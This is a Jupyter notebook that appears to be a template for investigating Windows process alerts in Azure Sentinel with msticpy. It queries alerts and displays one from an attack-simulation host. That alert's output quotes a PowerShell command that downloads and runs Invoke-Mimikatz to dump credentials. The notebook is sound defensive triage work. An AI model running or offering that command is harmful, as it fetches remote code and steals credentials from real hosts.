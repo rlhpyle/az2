{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Alert Investigation - Windows Process Alerts\n",
    "&lt;details&gt;\n",
    "    <summary> <u>Details...</u></summary>\n",
    "**Notebook Version:** 1.1<br>\n",
    "\n",
    "**Data Sources Used**:<br>\n",
    "- Log Analytics/Azure Sentinel\n",
    "    - SecurityAlert \n",
    "    - SecurityEvent\n",
    "<br>\n",
    "- Threat Intelligence Providers (Optional)\n",
    "    - OTX (https://otx.alienvault.com/)\n",
    "    - VirusTotal (https://www.virustotal.com/)\n",
    "    - XForce (https://www.ibm.com/security/xforce)\n",
    "&lt;/details&gt;\n",
    "\n",
    "This notebook is intended for triage and investigation of security alerts related to process execution. It is specifically targeted at alerts triggered by suspicious process activity on Windows hosts. "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "toc": true
   },
   "source": [
    "<h1>Table of Contents<span class=\"tocSkip\"></span></h1>\n",
    "<div class=\"toc\"><ul class=\"toc-item\"><li><span><a><span class=\"toc-item-num\">1  </span>Hunting Hypothesis</a></span></li><li><span><a><span class=\"toc-item-num\">2  </span>Notebook Initialization</a></span><ul class=\"toc-item\"><li><span><a><span class=\"toc-item-num\">2.1  </span>Get WorkspaceId and Authenticate to Log Analytics</a></span></li></ul></li><li><span><a><span class=\"toc-item-num\">3  </span>Get List of Alerts</a></span></li><li><span><a><span class=\"toc-item-num\">4  </span>Choose Alert to Investigate</a></span></li><li><span><a><span class=\"toc-item-num\">5  </span>Extract properties and entities from Alert</a></span></li><li><span><a><span class=\"toc-item-num\">6  </span>Entity Graph</a></span></li><li><span><a><span class=\"toc-item-num\">7  </span>Related Alerts</a></span><ul class=\"toc-item\"><li><span><a><span class=\"toc-item-num\">7.1  </span>Show these related alerts on a graph</a></span></li><li><span><a><span class=\"toc-item-num\">7.2  </span>Browse List of Related Alerts</a></span></li></ul></li><li><span><a><span class=\"toc-item-num\">8  </span>Get Process Tree</a></span><ul class=\"toc-item\"><li><span><a><span class=\"toc-item-num\">8.1  </span>Process Time Line</a></span></li></ul></li><li><span><a><span class=\"toc-item-num\">9  </span>Other Processes on Host - Clustering</a></span><ul class=\"toc-item\"><li><span><a><span class=\"toc-item-num\">9.1  </span>Clustered Processes</a></span></li><li><span><a><span class=\"toc-item-num\">9.2  </span>Variability in Command Lines and Process Names</a></span></li><li><span><a><span class=\"toc-item-num\">9.3  </span>Time Line of  clustered processes data vs. original data</a></span></li></ul></li><li><span><a><span class=\"toc-item-num\">10  </span>Base64 Decode and Check for IOCs</a></span><ul class=\"toc-item\"><li><span><a><span class=\"toc-item-num\">10.1  </span>IoCs in the entire data set</a></span></li><li><span><a><span class=\"toc-item-num\">10.2  </span>If any Base64 encoded strings, decode and search for IoCs in the results.</a></span></li></ul></li><li><span><a><span class=\"toc-item-num\">11  </span>Threat Intelligence Lookup</a></span></li><li><span><a><span class=\"toc-item-num\">12  </span>Alert command line - Occurrence on other hosts in workspace</a></span></li><li><span><a><span class=\"toc-item-num\">13  </span>Host Logons</a></span></li><li><span><a><span class=\"toc-item-num\">14  </span>Alert Logon Account</a></span><ul class=\"toc-item\"><li><span><a><span class=\"toc-item-num\">14.1  </span>All Host Logons</a></span></li><li><span><a><span class=\"toc-item-num\">14.2  </span>Comparing All Logons with Clustered results relative to Alert time line</a></span></li><li><span><a><span class=\"toc-item-num\">14.3  </span>View Process Session and Logon Events in Timelines</a></span></li></ul></li><li><span><a><span class=\"toc-item-num\">15  </span>Failed Logons</a></span></li><li><span><a><span class=\"toc-item-num\">16  </span>Appendices</a></span><ul class=\"toc-item\"><li><span><a><span class=\"toc-item-num\">16.1  </span>Available DataFrames</a></span></li><li><span><a><span class=\"toc-item-num\">16.2  </span>Saving Data to CSV</a></span></li><li><span><a><span class=\"toc-item-num\">16.3  </span>Saving Data to Excel</a></span></li></ul></li><li><span><a><span class=\"toc-item-num\">17  </span>Setup Cell</a></span><ul class=\"toc-item\"><li><span><a><span class=\"toc-item-num\">17.1  </span><code>msticpyconfig.yaml</code> configuration File</a></span></li></ul></li></ul></div>"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<a></a>[Contents](#toc)\n",
    "## Hunting Hypothesis\n",
    "Our broad initial hunting hypothesis is that a we have received an alert/indicators involving windows process name which is suspected to be malicious, we will need to hunt from a range of different positions to validate or disprove this hypothesis.\n",
    "\n",
    "Before you start hunting please run the cells in <a>Setup</a> at the bottom of this Notebook."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "ExecuteTime": {
     "end_time": "2019-10-28T21:29:26.482381Z",
     "start_time": "2019-10-28T21:29:26.468678Z"
    }
   },
   "source": [
    "## Notebook Initialization\n",
    "&lt;details&gt;\n",
    "    <summary> <u>Details...</u></summary>\n",
    "        If this is your first time running this Notebook please run the cells in in the <a>Setup</a> section before proceeding  to ensure you have the required packages installed correctly. Similarly if you see any import failures (```ImportError```) in the notebook, please make sure that you have run the [Setup](#setup) section first.\n",
    "    &lt;/details&gt;"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2019-10-31T21:29:42.661732Z",
     "start_time": "2019-10-31T21:29:42.62514Z"
    },
    "scrolled": true
   },
   "outputs": [],
   "source": [
    "# Imports\n",
    "import sys\n",
    "import warnings\n",
    "from msticpy.nbtools.utility import check_py_version\n",
    "\n",
    "MIN_REQ_PYTHON = (3, 6)\n",
    "check_py_version(MIN_REQ_PYTHON)\n",
    "\n",
    "import numpy as np\n",
    "from IPython import get_ipython\n",
    "from IPython.display import display, HTML, Markdown\n",
    "import ipywidgets as widgets\n",
    "\n",
    "import matplotlib.pyplot as plt\n",
    "import seaborn as sns\n",
    "import networkx as nx\n",
    "sns.set()\n",
    "\n",
    "\n",
    "import pandas as pd\n",
    "#setting pandas display options for dataframe\n",
    "pd.set_option(\"display.max_rows\", 100)\n",
    "pd.set_option(\"display.max_columns\", 50)\n",
    "pd.set_option(\"display.max_colwidth\", 100)\n",
    "\n",
    "# msticpy imports\n",
    "from msticpy.data import QueryProvider\n",
    "from msticpy.nbtools.entityschema import IpAddress, GeoLocation\n",
    "from msticpy.nbtools import *\n",
    "from msticpy.sectools import *\n",
    "from msticpy.nbtools.foliummap import FoliumMap\n",
    "from msticpy.nbtools.utility import md, md_warn, check_and_install_missing_packages\n",
    "from msticpy.nbtools.wsconfig import WorkspaceConfig\n",
    "from msticpy.nbtools.query_defns import DataFamily\n",
    "\n",
    "WIDGET_DEFAULTS = {\n",
    "    \"layout\": widgets.Layout(width=\"95%\"),\n",
    "    \"style\": {\"description_width\": \"initial\"},\n",
    "}\n",
    "\n",
    "# Some of our dependencies (networkx) still use deprecated Matplotlib\n",
    "# APIs - we can't do anything about it so suppress them from view\n",
    "from matplotlib import MatplotlibDeprecationWarning\n",
    "warnings.simplefilter(\"ignore\", category=MatplotlibDeprecationWarning)\n",
    "\n",
    "ws_config = WorkspaceConfig()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<a></a>[Contents](#toc)\n",
    "### Get WorkspaceId and Authenticate to Log Analytics \n",
    "&lt;details&gt;\n",
    "    <summary> <u>Details...</u></summary>\n",
    "If you are using user/device authentication, run the following cell. \n",
    "- Click the 'Copy code to clipboard and authenticate' button.\n",
    "- This will pop up an Azure Active Directory authentication dialog (in a new tab or browser window). The device code will have been copied to the clipboard. \n",
    "- Select the text box and paste (Ctrl-V/Cmd-V) the copied value. \n",
    "- You should then be redirected to a user authentication page where you should authenticate with a user account that has permission to query your Log Analytics workspace.\n",
    "\n",
    "Use the following syntax if you are authenticating using an Azure Active Directory AppId and Secret:\n",
    "```\n",
    "%kql loganalytics://tenant(aad_tenant).workspace(WORKSPACE_ID).clientid(client_id).clientsecret(client_secret)\n",
    "```\n",
    "instead of\n",
    "```\n",
    "%kql loganalytics://code().workspace(WORKSPACE_ID)\n",
    "```\n",
    "\n",
    "Note: you may occasionally see a JavaScript error displayed at the end of the authentication - you can safely ignore this.<br>\n",
    "On successful authentication you should see a ```popup schema``` button.\n",
    "To find your Workspace Id go to [Log Analytics](https://ms.portal.azure.com/#blade/HubsExtension/Resources/resourceType/Microsoft.OperationalInsights%2Fworkspaces). Look at the workspace properties to find the ID.\n",
    "&lt;/details&gt;"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2019-10-31T21:30:05.718363Z",
     "start_time": "2019-10-31T21:29:44.938992Z"
    }
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "\n",
       "                    &lt;script&gt;\n",
       "\n",
       "                        // close authentication window\n",
       "                        if (kql_MagicUserCodeAuthWindow &amp;&amp; kql_MagicUserCodeAuthWindow.opener != null &amp;&amp; !kql_MagicUserCodeAuthWindow.closed) {\n",
       "                            kql_MagicUserCodeAuthWindow.close()\n",
       "                        }\n",
       "                        // TODO: make sure, you clear the right cell. BTW, not sure it is a must to do any clearing\n",
       "\n",
       "                        // clear output cell\n",
       "                        Jupyter.notebook.clear_output(Jupyter.notebook.get_selected_index())\n",
       "\n",
       "                        // TODO: if in run all mode, move to last cell, otherwise move to next cell\n",
       "                        // move to next cell\n",
       "\n",
       "                    &lt;/script&gt;"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "\n",
       "            \n",
       "            <div style=\"\">\n",
       "            \n",
       "\n",
       "            <button>popup schema 52b1ab41-869e-4138-9e40-2a4457f09bf0@loganalytics</button>\n",
       "            \n",
       "            </div>\n",
       "\n",
       "            &lt;script&gt;\n",
       "\n",
       "            function kql_MagicLaunchWindowFunction(file_path, window_params, window_name, notebooks_host) {\n",
       "                var url;\n",
       "                if (notebooks_host == 'text') {\n",
       "                    url = ''\n",
       "                } else if (file_path.startsWith('http')) {\n",
       "                    url = file_path;\n",
       "                } else {\n",
       "                    var base_url = '';\n",
       "\n",
       "                    // check if azure notebook\n",
       "                    var azure_host = (notebooks_host == null || notebooks_host.length == 0) ? 'https://notebooks.azure.com' : notebooks_host;\n",
       "                    var start = azure_host.search('//');\n",
       "                    var azure_host_suffix = '.' + azure_host.substring(start+2);\n",
       "\n",
       "                    var loc = String(window.location);\n",
       "                    var end = loc.search(azure_host_suffix);\n",
       "                    start = loc.search('//');\n",
       "                    if (start &gt; 0 &amp;&amp; end &gt; 0) {\n",
       "                        var parts = loc.substring(start+2, end).split('-');\n",
       "                        if (parts.length == 2) {\n",
       "                            var library = parts[0];\n",
       "                            var user = parts[1];\n",
       "                            base_url = azure_host + '/api/user/' +user+ '/library/' +library+ '/html/';\n",
       "                        }\n",
       "                    }\n",
       "\n",
       "                    // check if local jupyter lab\n",
       "                    if (base_url.length == 0) {\n",
       "                        var configDataScipt  = document.getElementById('jupyter-config-data');\n",
       "                        if (configDataScipt != null) {\n",
       "                            var jupyterConfigData = JSON.parse(configDataScipt.textContent);\n",
       "                            if (jupyterConfigData['appName'] == 'JupyterLab' &amp;&amp; jupyterConfigData['serverRoot'] != null &amp;&amp;  jupyterConfigData['treeUrl'] != null) {\n",
       "                                var basePath = '/home/nbuser/library' + '/';\n",
       "                                if (basePath.startsWith(jupyterConfigData['serverRoot'])) {\n",
       "                                    base_url = '/files/' + basePath.substring(jupyterConfigData['serverRoot'].length+1);\n",
       "                                }\n",
       "                            } \n",
       "                        }\n",
       "                    }\n",
       "\n",
       "                    // assume local jupyter notebook\n",
       "                    if (base_url.length == 0) {\n",
       "\n",
       "                        var parts = loc.split('/');\n",
       "                        parts.pop();\n",
       "                        base_url = parts.join('/') + '/';\n",
       "                    }\n",
       "                    url = base_url + file_path;\n",
       "                }\n",
       "\n",
       "                window.focus();\n",
       "                var w = screen.width / 2;\n",
       "                var h = screen.height / 2;\n",
       "                params = 'width='+w+',height='+h;\n",
       "                kql_Magic__52b1ab41_869e_4138_9e40_2a4457f09bf0_at_loganalytics_schema = window.open(url, window_name, window_params + params);\n",
       "                if (url == '') {\n",
       "                    var el = kql_Magic__52b1ab41_869e_4138_9e40_2a4457f09bf0_at_loganalytics_schema.document.createElement('p');\n",
       "                    kql_Magic__52b1ab41_869e_4138_9e40_2a4457f09bf0_at_loganalytics_schema.document.body.overflow = 'auto';\n",
       "                    el.style.top = 0;\n",
       "                    el.style.left = 0;\n",
       "                    el.innerHTML = file_path;\n",
       "                    kql_Magic__52b1ab41_869e_4138_9e40_2a4457f09bf0_at_loganalytics_schema.document.body.appendChild(el);\n",
       "                }\n",
       "            }\n",
       "            &lt;/script&gt;\n",
       "\n",
       "            "
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "# Authentication\n",
    "qry_prov = QueryProvider(data_environment=\"LogAnalytics\")\n",
    "qry_prov.connect(connection_str=ws_config.code_connect_str)\n",
    "table_index = qry_prov.schema_tables"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Get List of Alerts\n",
    "\n",
    "We are using an alert as the starting point for this investigation, specify a time range to search for alerts. Once this is set run the following cell to retrieve any alerts in that time window.\n",
    "You can change the time range and re-run the queries until you find the alerts that you want to investigate."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2019-10-31T21:30:30.412222Z",
     "start_time": "2019-10-31T21:30:30.135628Z"
    }
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "HTML(value='<h4>Set query time boundaries</h4>')"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/plain": [
       "HBox(children=(DatePicker(value=datetime.date(2019, 10, 31), description='Origin Date'), Text(value='21:30:30.…"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/plain": [
       "VBox(children=(IntRangeSlider(value=(-3, 1), description='Time Range (hour):', layout=Layout(width='80%'), max…"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "alert_q_times = nbwidgets.QueryTime(units='hour',\n",
    "                                      max_before=20, max_after=1, before=3)\n",
    "alert_q_times.display()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 96,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2019-10-31T22:14:43.08816Z",
     "start_time": "2019-10-31T22:14:30.941641Z"
    },
    "scrolled": false
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "17  distinct alert types\n",
      "2333  distinct alerts\n"
     ]
    },
    {
     "data": {
      "text/html": [
       "\n",
       "    <div class=\"bk-root\">\n",
       "        <a class=\"bk-logo bk-logo-small bk-logo-notebook\"></a>\n",
       "        <span>Loading BokehJS ...</span>\n",
       "    </div>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {},
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "\n",
       "\n",
       "\n",
       "\n",
       "\n",
       "\n",
       "  <div class=\"bk-root\"></div>\n"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {},
     "metadata": {
      "application/vnd.bokehjs_exec.v0+json": {
       "id": "1388"
      }
     },
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>AlertName</th>\n",
       "      <th>alertCount</th>\n",
       "      <th>firstAlert</th>\n",
       "      <th>lastAlert</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>Custom Alert - a process was executed that is not allowed</td>\n",
       "      <td>2029</td>\n",
       "      <td>2019-09-12 01:39:36</td>\n",
       "      <td>2019-09-12 22:09:42</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>Custom alert - login of a user that is not on the allowed user list</td>\n",
       "      <td>230</td>\n",
       "      <td>2019-09-12 15:36:11</td>\n",
       "      <td>2019-09-12 22:06:13</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>Suspicious process executed</td>\n",
       "      <td>12</td>\n",
       "      <td>2019-09-12 21:39:14</td>\n",
       "      <td>2019-09-12 21:44:38</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>AndiTest</td>\n",
       "      <td>11</td>\n",
       "      <td>2019-09-12 02:10:18</td>\n",
       "      <td>2019-09-12 22:11:24</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>Case 1</td>\n",
       "      <td>10</td>\n",
       "      <td>2019-09-12 03:03:34</td>\n",
       "      <td>2019-09-12 21:04:47</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>5</th>\n",
       "      <td>test</td>\n",
       "      <td>10</td>\n",
       "      <td>2019-09-12 03:07:34</td>\n",
       "      <td>2019-09-12 21:08:33</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>6</th>\n",
       "      <td>Vani's Alert</td>\n",
       "      <td>4</td>\n",
       "      <td>2019-09-12 05:46:53</td>\n",
       "      <td>2019-09-12 20:47:10</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>7</th>\n",
       "      <td>Suspicious download using Certutil detected</td>\n",
       "      <td>4</td>\n",
       "      <td>2019-09-12 19:01:16</td>\n",
       "      <td>2019-09-12 21:36:45</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>8</th>\n",
       "      <td>Suspicious Powershell Activity Detected</td>\n",
       "      <td>3</td>\n",
       "      <td>2019-09-12 21:37:30</td>\n",
       "      <td>2019-09-12 21:37:31</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>9</th>\n",
       "      <td>Windows registry persistence method detected</td>\n",
       "      <td>3</td>\n",
       "      <td>2019-09-12 21:39:14</td>\n",
       "      <td>2019-09-12 21:39:17</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "                                                             AlertName  \\\n",
       "0            Custom Alert - a process was executed that is not allowed   \n",
       "1  Custom alert - login of a user that is not on the allowed user list   \n",
       "2                                          Suspicious process executed   \n",
       "3                                                             AndiTest   \n",
       "4                                                               Case 1   \n",
       "5                                                                 test   \n",
       "6                                                         Vani's Alert   \n",
       "7                          Suspicious download using Certutil detected   \n",
       "8                              Suspicious Powershell Activity Detected   \n",
       "9                         Windows registry persistence method detected   \n",
       "\n",
       "   alertCount          firstAlert           lastAlert  \n",
       "0        2029 2019-09-12 01:39:36 2019-09-12 22:09:42  \n",
       "1         230 2019-09-12 15:36:11 2019-09-12 22:06:13  \n",
       "2          12 2019-09-12 21:39:14 2019-09-12 21:44:38  \n",
       "3          11 2019-09-12 02:10:18 2019-09-12 22:11:24  \n",
       "4          10 2019-09-12 03:03:34 2019-09-12 21:04:47  \n",
       "5          10 2019-09-12 03:07:34 2019-09-12 21:08:33  \n",
       "6           4 2019-09-12 05:46:53 2019-09-12 20:47:10  \n",
       "7           4 2019-09-12 19:01:16 2019-09-12 21:36:45  \n",
       "8           3 2019-09-12 21:37:30 2019-09-12 21:37:31  \n",
       "9           3 2019-09-12 21:39:14 2019-09-12 21:39:17  "
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "alert_list = qry_prov.SecurityAlert.list_alerts(\n",
    "    alert_q_times)\n",
    "alert_counts = qry_prov.SecurityAlert.list_alerts_counts(\n",
    "    alert_q_times)\n",
    "\n",
    "if isinstance(alert_list, pd.DataFrame) and not alert_list.empty:\n",
    "    print(len(alert_counts), ' distinct alert types')\n",
    "    print(len(alert_list), ' distinct alerts')\n",
    "\n",
    "# Display alerts on timeline to aid in visual grouping\n",
    "    nbdisplay.display_timeline(\n",
    "        data=alert_list, source_columns=[\"AlertName\", 'CompromisedEntity'], title=\"Alerts over time\", height=300, color=\"red\")\n",
    "    display(alert_counts.head(10)) # remove '.head(10)'' to see the full list grouped by AlertName\n",
    "else:\n",
    "    display(Markdown('No related alerts found.'))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Choose Alert to Investigate\n",
    "To focus the investigation select an alert from a list of retrieved alerts.\n",
    "\n",
    "As you select an alert, the main properties will be shown below the list.\n",
    "\n",
    "Use the filter box to narrow down your search to any substring in the AlertName."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 97,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2019-10-31T22:14:49.109695Z",
     "start_time": "2019-10-31T22:14:48.33277Z"
    },
    "scrolled": false
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "VBox(children=(Text(value='', description='Filter alerts by title:', style=DescriptionStyle(description_width=…"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "get_alert = None\n",
    "alert_select = nbwidgets.AlertSelector(alerts=alert_list, action=nbdisplay.display_alert)\n",
    "alert_select.display()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Extract properties and entities from Alert\n",
    "In order to pivot to data related to the selected security alert we need to identify key data points in the selected alert. This section extracts the alert information and entities into a SecurityAlert object allowing us to query the properties more reliably. \n",
    "\n",
    "Properties in this object will be used to automatically provide parameters for queries and UI elements.\n",
    "Subsequent queries will use properties like the host name and derived properties such as the OS family (Linux or Windows) to adapt the query. Query time selectors like the one above will also default to an origin time that matches the alert selected.\n",
    "\n",
    "The alert view below shows all of the main properties of the alert plus the extended property dictionary (if any) and JSON representations of the Entity."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 98,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2019-10-31T22:15:23.440397Z",
     "start_time": "2019-10-31T22:15:23.371975Z"
    },
    "scrolled": false
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "\n",
       "            <h3>Alert: 'Suspicious Powershell Activity Detected'</h3><br>time=<b>2019-09-12 21:37:27</b>,\n",
       "            entity=<b>WINATTACKSIM</b>, id=<b>2518339765525617422_d7a3b4c4-1794-40d8-bc60-19315106dba3</b>\n",
       "            <br>\n",
       "            <table class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>2202</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>TenantId</th>\n",
       "      <td>52b1ab41-869e-4138-9e40-2a4457f09bf0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>TimeGenerated</th>\n",
       "      <td>2019-09-12 21:37:31</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>AlertDisplayName</th>\n",
       "      <td>Suspicious Powershell Activity Detected</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>AlertName</th>\n",
       "      <td>Suspicious Powershell Activity Detected</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Severity</th>\n",
       "      <td>High</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Description</th>\n",
       "      <td>Analysis of host data detected a powershell script running on WINATTACKSIM that has features in common with known suspicious scripts. This script could either be legitimate activity, or an indication of a compromised host.</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>ProviderName</th>\n",
       "      <td>Detection</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>VendorName</th>\n",
       "      <td>Microsoft</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>VendorOriginalId</th>\n",
       "      <td>d7a3b4c4-1794-40d8-bc60-19315106dba3</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>SystemAlertId</th>\n",
       "      <td>2518339765525617422_d7a3b4c4-1794-40d8-bc60-19315106dba3</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>ResourceId</th>\n",
       "      <td>/subscriptions/40dcc8bf-0478-4f3b-b275-ed0a94f2c013/resourceGroups/ASIHuntOMSWorkspaceRG/providers/Microsoft.Compute/virtualMachines/WinAttackSim</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>SourceComputerId</th>\n",
       "      <td>e72f40cd-a7d2-4a41-8562-3f32da204b36</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>AlertType</th>\n",
       "      <td>SCUBA_PSINSIGHT</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>ConfidenceLevel</th>\n",
       "      <td>Unknown</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>ConfidenceScore</th>\n",
       "      <td>NaN</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>IsIncident</th>\n",
       "      <td>False</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>StartTimeUtc</th>\n",
       "      <td>2019-09-12 21:37:27</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>EndTimeUtc</th>\n",
       "      <td>2019-09-12 21:37:27</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>ProcessingEndTime</th>\n",
       "      <td>2019-09-12 21:37:32</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>RemediationSteps</th>\n",
       "      <td>[\\r\\n  \"Review with WINATTACKSIM\\\\AttackAdmin the suspicious script in this alert to see if you recognise this as legitimate administrative activity. If not, Escalate the alert to the information security team.\"\\r\\n]</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>ExtendedProperties</th>\n",
       "      <td>{'Compromised Host': 'WINATTACKSIM', 'User Name': 'WINATTACKSIM\\AttackAdmin', 'Account Session Id': '0x1caf88b', 'Suspicious Process': 'c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe', 'Suspicious Command Line': 'powershell.exe  \"iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/mattifestation/powersploit/master/exfiltration/invoke-mimikatz.ps1');invoke-mimikatz -dumpcreds\"', 'Parent Process': 'c:\\windows\\system32\\cmd.exe', 'Suspicious Process Id': '0x1568', 'Suspicious Script': 'powershell.exe  \"iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1');Invoke-Mimikatz -DumpCreds\"', 'resourceType': 'Virtual Machine', 'ServiceId': '14fa08c7-c48e-4c18-950c-8148024b4398', 'ReportingSystem': 'Azure', 'OccuringDatacenter': 'eastus'}</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Entities</th>\n",
       "      <td>[{'$id': '4', 'DnsDomain': '', 'NTDomain': '', 'HostName': 'WINATTACKSIM', 'NetBiosName': 'WINATTACKSIM', 'AzureID': '/subscriptions/40dcc8bf-0478-4f3b-b275-ed0a94f2c013/resourceGroups/ASIHuntOMSWorkspaceRG/providers/Microsoft.Compute/virtualMachines/WinAttackSim', 'OMSAgentID': 'e72f40cd-a7d2-4a41-8562-3f32da204b36', 'OSFamily': 'Windows', 'OSVersion': 'Windows', 'IsDomainJoined': False, 'Type': 'host'}, {'$id': '5', 'Name': 'AttackAdmin', 'NTDomain': 'WinAttackSim', 'Host': {'$ref': '4'}, 'Sid': 'S-1-5-21-3355618666-3700345348-2252427328-500', 'IsDomainJoined': False, 'Type': 'account', 'LogonId': '0x1caf88b'}, {'$id': '6', 'Directory': 'c:\\windows\\system32', 'Name': 'cmd.exe', 'Type': 'file'}, {'$id': '7', 'ProcessId': '0x1ae8', 'CommandLine': '', 'ImageFile': {'$ref': '6'}, 'Host': {'$ref': '4'}, 'Type': 'process'}, {'$id': '8', 'Directory': 'c:\\windows\\system32\\windowspowershell\\v1.0', 'Name': 'powershell.exe', 'Type': 'file'}, {'$id': '9', 'ProcessId': '0x1568', 'CommandLine': 'powershell.exe  \"iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/mattifestation/powersploit/master/exfiltration/invoke-mimikatz.ps1');invoke-mimikatz -dumpcreds\"', 'ElevationToken': 'Default', 'CreationTimeUtc': '2019-09-12T21:37:27.4382577Z', 'ImageFile': {'$ref': '8'}, 'Account': {'$ref': '5'}, 'ParentProcess': {'$ref': '7'}, 'Host': {'$ref': '4'}, 'Type': 'process'}, {'$id': '10', 'SessionId': '0x1caf88b', 'StartTimeUtc': '2019-09-12T21:37:27.4382577Z', 'EndTimeUtc': '2019-09-12T21:37:27.4382577Z', 'Type': 'host-logon-session', 'Host': {'$ref': '4'}, 'Account': {'$ref': '5'}}]</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>SourceSystem</th>\n",
       "      <td>Detection</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>WorkspaceSubscriptionId</th>\n",
       "      <td>40dcc8bf-0478-4f3b-b275-ed0a94f2c013</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>WorkspaceResourceGroup</th>\n",
       "      <td>asihuntomsworkspacerg</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>ExtendedLinks</th>\n",
       "      <td></td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>ProductName</th>\n",
       "      <td>Azure Security Center</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>ProductComponentName</th>\n",
